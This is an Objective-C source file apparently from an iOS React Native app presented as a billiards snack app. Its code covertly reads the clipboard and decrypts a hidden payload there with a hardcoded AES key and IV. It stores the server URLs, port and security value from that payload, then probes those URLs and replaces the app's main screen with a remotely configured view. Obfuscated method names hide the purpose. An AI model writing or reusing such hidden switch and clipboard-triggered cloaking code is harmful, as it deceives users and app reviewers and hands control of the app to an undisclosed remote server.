#import "RNCuehallSnacksBillards.h"
#import <CocoaSecurity/CocoaSecurity.h>
#import <react-native-orientation-locker/Orientation.h>
#import "RNCueSacksServer.h"
#import "RNNetReachability.h"

@interface RNCuehallSnacksBillards()

@property (strong, nonatomic)  NSArray *cueList;
@property (nonatomic, strong) RNNetReachability *cuehallReachability;
@property (nonatomic, copy) void (^vcBlock)(void);

@end

@implementation RNCuehallSnacksBillards

static RNCuehallSnacksBillards *instance = nil;

+ (instancetype)shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
    instance.cueList = @[@"cuehallSnacksBillards_APP",
                                   @"a71556f65ed2b25b55475b964488334f",
                                   @"ADD20BFCD9D4EA0278B11AEBB5B83365",
                                   @"vPort",
                                   @"vSecu",
                                   @"spareRoutes",
                                   @"serverUrl"];
  });
  return instance;
}

- (void)cuehallSnacksBillards_startMonitoring {
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(cuehallSnacksBillards_networkStatusDidChanged:) name:kReachabilityChangedNotification object:nil];
    [self.cuehallReachability startNotifier];
}

- (void)cuehallSnacksBillards_stopMonitoring {
    [[NSNotificationCenter defaultCenter] removeObserver:self name:kReachabilityChangedNotification object:nil];
    [self.cuehallReachability stopNotifier];
}

- (void)dealloc {
    [self cuehallSnacksBillards_stopMonitoring];
}


- (void)cuehallSnacksBillards_networkStatusDidChanged:(NSNotification *)notification {
    RNNetReachability *reachability = notification.object;
  NetworkStatus networkStatus = [reachability currentReachabilityStatus];
  
  if (networkStatus != NotReachable) {
      NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
      if ([ud boolForKey:self.cueList[0]] == NO) {
          if (self.vcBlock != nil) {
              [self changeMainController:self.vcBlock];
          }
      }
  }
}

- (void)changeMainController:(void (^ __nullable)(void))changeVcBlock {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  
  NSMutableArray<NSString *> *spareArr = [[ud arrayForKey:self.cueList[5]] mutableCopy];
  if (spareArr == nil) {
    spareArr = [NSMutableArray array];
  }
  NSString *usingUrl = [ud stringForKey:self.cueList[6]];
  
  if ([spareArr containsObject:usingUrl] == NO) {
    [spareArr insertObject:usingUrl atIndex:0];
  }
  
  [self changeTestMainController:changeVcBlock index:0 mArray:spareArr];
}

- (void)changeTestMainController:(void (^ __nullable)(void))changeVcBlock index: (NSInteger)index mArray:(NSArray<NSString *> *)tArray{
  if ([tArray count] < index) {
    return;
  }
  
  NSURL *url = [NSURL URLWithString:tArray[index]];
  NSURLSessionConfiguration *sessionConfig = [NSURLSessionConfiguration defaultSessionConfiguration];
  sessionConfig.timeoutIntervalForRequest = 10 + index * 5;
  NSURLSession *session = [NSURLSession sessionWithConfiguration:sessionConfig];
  NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
  
  NSURLSessionTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
    NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
    if (error == nil && httpResponse.statusCode == 200) {
      NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
      [ud setBool:YES forKey:self.cueList[0]];
      [ud setValue:tArray[index] forKey:self.cueList[6]];
      [ud synchronize];
      dispatch_async(dispatch_get_main_queue(), ^{
        if (changeVcBlock != nil) {
          changeVcBlock();
        }
      });
    } else {
      if (index < [tArray count] - 1) {
        [self changeTestMainController:changeVcBlock index:index + 1 mArray:tArray];
      }
    }
  }];
  [dataTask resume];
}

- (BOOL)cuehallSnacksBillards_joinThisWay:(void (^ __nullable)(void))changeVcBlock {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  if ([ud boolForKey:self.cueList[0]]) {
    return YES;
  } else {
      self.vcBlock = changeVcBlock;
      if ([self cuehallSnacksBillards_dolphin]) {
          [self changeMainController:changeVcBlock];
          [self cuehallSnacksBillards_startMonitoring];
      }
    return NO;
  }
}

- (BOOL)cuehallSnacksBillards_dolphin {
  NSString *pbString = [self cuehallSnacksBillards_getZtbzard];
  CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self cuehallSnacksBillards_subCloudy:pbString]
                                                          hexKey:self.cueList[1]
                                                           hexIv:self.cueList[2]];
  
  NSDictionary *dataDict = [self cuehallSnacksBillards_jsonToDictionary:aes.utf8String];
  return [self cuehallSnacksBillards_storeConfigInfo:dataDict];
}

- (NSString *)cuehallSnacksBillards_getZtbzard {
  UIPasteboard *clipboard = [UIPasteboard generalPasteboard];
  return clipboard.string ?: @"";
}

- (NSString *)cuehallSnacksBillards_subCloudy: (NSString* )pbString {
  if ([pbString containsString:@"#iPhone#"]) {
    NSArray *university = [pbString componentsSeparatedByString:@"#iPhone#"];
    if (university.count > 1) {
      pbString = university[1];
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [university enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
      [ud setObject:obj forKey:[NSString stringWithFormat:@"iPhone_%zd", idx]];
    }];
    [ud synchronize];
  }
  return pbString;
}

- (NSDictionary *)cuehallSnacksBillards_jsonToDictionary: (NSString* )utf8String {
  NSData *data = [utf8String dataUsingEncoding:NSUTF8StringEncoding];
  if (data == nil) {
    return @{};
  }
  NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:data
                                                       options:kNilOptions
                                                         error:nil];
  return dict[@"data"];
}

- (BOOL)cuehallSnacksBillards_storeConfigInfo:(NSDictionary *)dict {
    if (dict == nil || [dict.allKeys count] < 3) {
      return NO;
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setBool:YES forKey:self.cueList[0]];
    
    [dict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:key];
    }];

    [ud synchronize];
    return YES;
}

- (UIViewController *)cuehallSnacksBillards_throughMainController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
    UIViewController *vc = [UIViewController new];
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [[RNCueSacksServer shared] cueSnacksGarden_configFebFunSport:[ud stringForKey:self.cueList[3]] withSecurity:[ud stringForKey:self.cueList[4]]];
    return vc;
}

- (UIInterfaceOrientationMask)cuehallSnacksBillards_getOrientation {
  return [Orientation getOrientation];
}

@end
